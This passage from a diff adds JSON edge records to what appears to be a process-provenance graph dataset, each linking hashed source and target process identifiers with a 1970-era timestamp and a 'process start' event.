+            "time": "1970-02-21 19:47:35",
+            "syscall": "process start",
+            "id": "96"
+        },
+        {
+            "source": "d4ee1c99352260eaf83270ab10841e2c",
+            "target": "4b451debdfbe42f32fd5244a47d64b0c",
+            "time": "1970-02-21 19:45:48",
+            "syscall": "process start",
+            "id": "97"
+        },
+        {
+            "source": "d4ee1c99352260eaf83270ab10841e2c",
+            "target": "798e891c89858fd138fe1c25e5b4a6fa",
+            "time": "1970-02-21 19:45:28",
+            "syscall": "process start",
+            "id": "98"
+        },
+        {
+            "source": "35539842b904d5cea2881cce0f9381a0",
+            "target": "28b92fabeee1f17f2ae53a8163e57869",
+            "time": "1970-02-22 12:47:16",
+            "syscall": "process start",
+            "id": "99"
+        },
+        {
+            "source": "35539842b904d5cea2881cce0f9381a0",
+            "target": "848d27c9a2e82cf8607331bbfaf73e4c",
+            "time": "1970-02-22 12:52:39",
+            "syscall": "process start",
+            "id": "100"
+        },
+        {
+            "source": "461a96301fbef83bf800a37502ec3a31",
+            "target": "28df61e34c38cf8bb31057719bd71c36",
+            "time": "1970-02-22 13:00:18",
+            "syscall": "process start",
+            "id": "101"
+        },
+        {
+            "source": "461a96301fbef83bf800a37502ec3a31",
+            "target": "2c315afbb87bf1f8a4d76b6b092c4c32",
+            "time": "1970-02-22 13:47:40",
+            "syscall": "process start",
+            "id": "102"
+        },
+        {
+            "source": "461a96301fbef83bf800a37502ec3a31",
+            "target": "642537170a52f6f56dc48c72963d8d9a",
+            "time": "1970-02-22 13:00:32",
+            "syscall": "process start",
+            "id": "103"
+        },
+        {
+            "source": "461a96301fbef83bf800a37502ec3a31",
+            "target": "6f402df2752c57cb981ac4940cc6f827",
+            "time": "1970-02-22 13:00:26",
+            "syscall": "process start",
+            "id": "104"
+        },
+        {
+            "source": "461a96301fbef83bf800a37502ec3a31",
+            "target": "762ff7e8841774fe79eaefd4b98fef3c",
+            "time": "1970-02-22 12:59:58",
+            "syscall": "process start",
+            "id": "105"
+        },
+        {
+            "source": "56fe4a0466a3a3b63ab49e9247d2d655",
+            "target": "5377560cff056698bc3091463410fcbe",
+            "time": "1970-02-22 12:37:02",
+            "syscall": "process start",
+            "id": "106"
+        },
+        {
+            "source": "56fe4a0466a3a3b63ab49e9247d2d655",
+            "target": "ec67110d7643774936a7deb732230674",
+            "time": "1970-02-22 12:36:41",
+            "syscall": "process start",
+            "id": "107"
+        },
+        {
+            "source": "56fe4a0466a3a3b63ab49e9247d2d655",
+            "target": "f5c9c661a3b8223737e82dedbb0cdc6c",
+            "time": "1970-02-22 12:37:04",
+            "syscall": "process start",
+            "id": "108"
+        },
+        {
+            "source": "61e7e2b9aebf24de1b03546d553ac07b",
+            "target": "a0189eac0beac9dd051a62686fe3ee9e",
+            "time": "1970-02-22 12:27:07",
+            "syscall": "process start",
+            "id": "109"
+        },
+        {
+            "source": "af78bca578b8af6cbb0c48f6982bb3c4",
+            "target": "641c50ddbba159743f1d85b17993b4c0",
+            "time": "1970-02-22 12:38:48",
+            "syscall": "process start",
+            "id": "110"
+        },
+        {
+            "source": "af78bca578b8af6cbb0c48f6982bb3c4",
+            "target": "f80dace5b1042f612172106625c4b235",
+            "time": "1970-02-22 12:43:59",
+            "syscall": "process start",
+            "id": "111"
+        },
+        {
+            "source": "65b6784bf0b757d8dda52d2b7c38db9e",
+            "target": "a5a3a54771069c119f39870e132cb356",
+            "time": "1970-02-15 15:00:37",
+            "syscall": "process start",
+            "id": "112"
+        },
+        {
+            "source": "8de52a0399d5f21a4554f7c8fd4be229",
+            "target": "3c3ef21fee15d93d2d83ac6d288b04f8",
+            "time": "1970-02-15 14:58:22",
+            "syscall": "process start",
+            "id": "113"
+        },
+        {
+            "source": "219d2dd9d2ee376588c24c26a711a6af",
+            "target": "864589f3b7c5299f9ef01a27b4979b8f",
+            "time": "1970-02-19 13:34:20",
+            "syscall": "process start",
+            "id": "114"
+        },
+        {
+            "source": "219d2dd9d2ee376588c24c26a711a6af",
+            "target": "99eedf0076ac1a6f94aebdbb81ea45f9",
+            "time": "1970-02-19 13:39:34",
+            "syscall": "process start",
+            "id": "115"
+        },
+        {
+            "source": "a5679c643be3c5219e9fcd09266480dd",
+            "target": "8ac931e5618a6200e6557ae769b21c1d",
+            "time": "1970-02-19 13:25:11",
+            "syscall": "process start",
+            "id": "116"
+        },
+        {
+            "source": "e1af9edecf8a93ce10c5183a287ed85e",
+            "target": "5c1f1ec6667430a87316f608d94b08fb",
+            "time": "1970-02-20 06:30:38",
+            "syscall": "process start",
+            "id": "117"
+        },
+        {
+            "source": "5932abe52fabb99ec8b4fb8ee3e92aa4",
+            "target": "aeaddb88ea0df0a2fc129891fa59706b",
+            "time": "1970-02-19 07:55:14",
+            "syscall": "process start",
+            "id": "118"
+        },
+        {
+            "source": "99eedf0076ac1a6f94aebdbb81ea45f9",
+            "target": "c0d8d8234b4036793960fd97cfcee27e",
+            "time": "1970-02-19 13:40:24",
+            "syscall": "process start",
+            "id": "119"
+        },
+        {
+            "source": "4b1d560f1821ad43a18427b64366b8fa",
+            "target": "342ae1eab1c260316fe2d61acae7c124",
+            "time": "1970-02-20 03:43:42",
+            "syscall": "process start",
+            "id": "120"
+        },
+        {
+            "source": "4b1d560f1821ad43a18427b64366b8fa",
+            "target": "fbcad28e9f3572c21ff47286680ec8a4",
+            "time": "1970-02-20 03:45:08",
+            "syscall": "process start",
+            "id": "121"
+        },
+        {
+            "source": "4b1d560f1821ad43a18427b64366b8fa",
+            "target": "ff4efeb67238ca4304c82b5e12482f28",
+            "time": "1970-02-20 03:44:00",
+            "syscall": "process start",
+            "id": "122"
+        },
+        {
+            "source": "342ae1eab1c260316fe2d61acae7c124",
+            "target": "21eda83975d0099e3a67781c635afb56",
+            "time": "1970-02-20 03:43:48",
+            "syscall": "process start",
+            "id": "123"
+        },
+        {
+            "source": "fbcad28e9f3572c21ff47286680ec8a4",
+            "target": "e1a1cb04ed4d69f7ad8bc98fbafbf696",
+            "time": "1970-02-20 03:45:14",
+            "syscall": "process start",
+            "id": "124"
+        },
+        {
+            "source": "ff4efeb67238ca4304c82b5e12482f28",
+            "target": "50714ac93f42c80e4c19f1bc65d411b3",
+            "time": "1970-02-20 03:44:05",
+            "syscall": "process start",
+            "id": "125"
+        },
+        {
+            "source": "24e5e152c70094f669e74bec8a230515",
+            "target": "bef84199ca8703a9473406793315189c",
+            "time": "1970-02-21 19:54:39",
+            "syscall": "process start",
+            "id": "126"
+        },
+        {
+            "source": "848d27c9a2e82cf8607331bbfaf73e4c",
+            "target": "7b8aaade18faecc9db7a92855ca0216b",
+            "time": "1970-02-22 12:53:29",
+            "syscall": "process start",
+            "id": "127"
+        },
+        {
+            "source": "f80dace5b1042f612172106625c4b235",
+            "target": "d259f8d37e7f8146c5ae2e8913d0e27d",
+            "time": "1970-02-22 12:44:51",
+            "syscall": "process start",
+            "id": "128"
+        }
+    ]
+}
